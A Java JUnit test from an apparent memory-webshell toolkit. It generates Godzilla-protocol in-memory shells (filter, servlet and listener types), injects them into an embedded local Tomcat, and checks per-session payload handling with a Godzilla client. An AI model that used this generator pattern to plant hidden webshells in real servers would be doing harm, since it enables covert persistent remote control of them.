package com.reajason.javaweb.examples.customgui.shelltool;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.godzilla.GodzillaManager;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.utils.ClassDefiner;
import org.apache.catalina.Session;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.startup.Tomcat;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 使用期验证：把生成的内存马注入内嵌 Tomcat，用真实的哥斯拉协议客户端（tools:godzilla）连上去。
 *
 * <p>覆盖本示例的关键行为：
 * <ul>
 *   <li>core 不落静态字段，而是跟着会话走；</li>
 *   <li>同一条连接（会话）：第一次请求注入 core，之后每个请求都命中会话里的 core；</li>
 *   <li>不同连接（新会话）：各自重新注入一份 core，互不影响；</li>
 *   <li>连接关闭（客户端 close 会让服务端 invalidate session）后 core 随之释放。</li>
 * </ul>
 *
 * @author ReaJason
 */
class GodzillaSessionEmbeddedTomcatTest {

    private static final String PASS = "passFilter";
    private static final String KEY = "keyFilter";

    @TempDir
    Path baseDir;

    private Tomcat tomcat;
    private StandardContext context;
    private String url;

    static Stream<Arguments> servletApiShellTypes() {
        return Stream.of(
                // shellType, 注入 urlPattern, 客户端访问路径
                Arguments.of(ShellType.FILTER, "/*", "/test"),
                Arguments.of(ShellType.SERVLET, "/shell", "/shell"),
                Arguments.of(ShellType.LISTENER, "/*", "/test"));
    }

    @BeforeEach
    void startTomcat() throws Exception {
        Files.createDirectories(baseDir.resolve("webapp"));
        tomcat = new Tomcat();
        tomcat.setBaseDir(baseDir.resolve("tomcat").toString());
        tomcat.setPort(0);
        tomcat.getConnector();
        // addWebapp（而不是 addContext）：这样容器会装上默认 servlet 映射，
        // 请求才会走到 filter chain —— 内存马就是在 filter chain 里被调用的
        context = (StandardContext) tomcat.addWebapp("", baseDir.resolve("webapp").toString());
        tomcat.start();
        url = "http://127.0.0.1:" + tomcat.getConnector().getLocalPort();
    }

    @AfterEach
    void stopTomcat() throws Exception {
        if (tomcat != null) {
            tomcat.stop();
            tomcat.destroy();
        }
    }

    @ParameterizedTest
    @MethodSource("servletApiShellTypes")
    void coreLivesInSessionAndIsReInjectedPerConnection(String shellType, String urlPattern, String path) throws Exception {
        GodzillaSessionConfig toolConfig = GodzillaSessionConfig.builder()
                .pass(PASS)
                .key(KEY)
                // 哥斯拉客户端默认 UA 里带 Firefox，模板按 contains 匹配
                .headerValue("Firefox")
                .build();
        MemShellResult result = new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(Server.Tomcat)
                        .shellTool(GodzillaSessionShellToolProvider.NAME)
                        .shellType(shellType)
                        .build(),
                InjectorConfig.builder().urlPattern(urlPattern).build(),
                toolConfig);

        // 集成测试同款用法：生成的是注入器，跑起来由它自己找到容器 context 完成注入
        ClassDefiner.defineClass(result.getInjectorBytes()).getDeclaredConstructor().newInstance();

        Class<?> shellClass = context.getLoader().getClassLoader().loadClass(result.getShellClassName());
        String sessionKey = readStaticField(shellClass, "sessionKey");
        assertEquals(toolConfig.getSessionKey(), sessionKey);
        // 内存马类里没有 payload 静态字段，core 只在会话里
        assertThrows(NoSuchFieldException.class, () -> shellClass.getDeclaredField("payload"));
        assertTrue(payloadsInSessions(sessionKey).isEmpty(), "还没有连接，会话里不该有 core");

        // 第一条连接：第一次请求注入 core，之后的请求命中会话里的 core
        try (GodzillaManager first = godzilla(url + path)) {
            assertTrue(first.start(), "core 注入请求失败");
            assertTrue(first.test(), "同一会话的后续请求没有命中会话里的 core");

            List<Class<?>> payloads = payloadsInSessions(sessionKey);
            assertEquals(1, payloads.size(), "core 应当存放在会话里");
            Class<?> firstCore = payloads.get(0);
            // core 由内存马新建的 ClassLoader 定义，和内存马自身隔离开
            assertNotEquals(shellClass.getClassLoader(), firstCore.getClassLoader());

            // 第二条连接：新会话重新注入一份 core，两条连接互不影响
            try (GodzillaManager second = godzilla(url + path)) {
                assertTrue(second.start(), "第二条连接的 core 注入请求失败");
                assertTrue(second.test(), "第二条连接没有命中自己的 core");

                List<Class<?>> both = payloadsInSessions(sessionKey);
                assertEquals(2, both.size(), "每条连接（会话）各持有一份 core");
                assertNotSame(both.get(0), both.get(1), "两个会话的 core 应当是各自定义出来的");
            }
        }

        // 客户端 close 会让服务端 invalidate session，core 随会话一起释放
        assertTrue(payloadsInSessions(sessionKey).isEmpty(), "会话结束后 core 不应继续驻留");
    }

    private static GodzillaManager godzilla(String entrypoint) {
        return GodzillaManager.builder().entrypoint(entrypoint).pass(PASS).key(KEY).build();
    }

    private List<Class<?>> payloadsInSessions(String sessionKey) {
        List<Class<?>> payloads = new ArrayList<>();
        for (Session session : context.getManager().findSessions()) {
            Object payload = session.getSession().getAttribute(sessionKey);
            if (payload != null) {
                payloads.add((Class<?>) payload);
            }
        }
        return payloads;
    }

    private static String readStaticField(Class<?> clazz, String name) {
        try {
            Field field = clazz.getDeclaredField(name);
            field.setAccessible(true);
            return (String) field.get(null);
        } catch (ReflectiveOperationException e) {
            throw new AssertionError(e);
        }
    }
}
